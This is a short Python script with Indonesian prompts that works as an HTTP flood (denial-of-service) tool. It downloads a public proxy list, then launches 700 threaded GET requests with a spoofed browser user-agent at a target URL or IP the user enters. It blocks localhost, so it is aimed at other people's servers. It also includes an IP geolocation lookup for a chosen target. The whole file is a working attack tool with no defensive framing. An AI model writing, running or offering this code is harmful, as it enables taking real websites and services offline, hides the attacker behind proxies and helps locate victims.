import requests, threading, time, random, sys

proxies = []
try:
    proxy_list = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5).text.splitlines()
    for proxy in proxy_list:
        proxies.append({"http": f"http://{proxy}", "https": f"http://{proxy}"})
except:
    proxies = [None]

def attack(url):
    print("Sedang proses menyerang...")
    def send():
        try:
            proxy = random.choice(proxies)
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Accept": "*/*"
            }
            requests.get(url, headers=headers, proxies=proxy, timeout=3)
        except:
            pass

    threads = []
    for _ in range(700):
        t = threading.Thread(target=send)
        t.start()
        threads.append(t)

    for t in threads:
        t.join(timeout=10)

    print("Selesai mengirim serangan.")

def ip_tracker():
    ip = input("Masukkan IP target: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        print("\n[ Hasil Pelacakan IP ]")
        print(f"IP      : {r.get('query')}")
        print(f"Negara  : {r.get('country')}")
        print(f"Region  : {r.get('regionName')}")
        print(f"Kota    : {r.get('city')}")
        print(f"ISP     : {r.get('isp')}")
        print(f"Zona Waktu : {r.get('timezone')}")
    except:
        print("Gagal melacak IP.")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "track":
        ip_tracker()
    else:
        target = input("Masukkan URL/IP Target (contoh: http://123.45.67.89): ")
        if "127.0.0.1" in target or "localhost" in target:
            print("Error: Jangan gunakan localhost/IP sendiri.")
        else:
            attack(target)
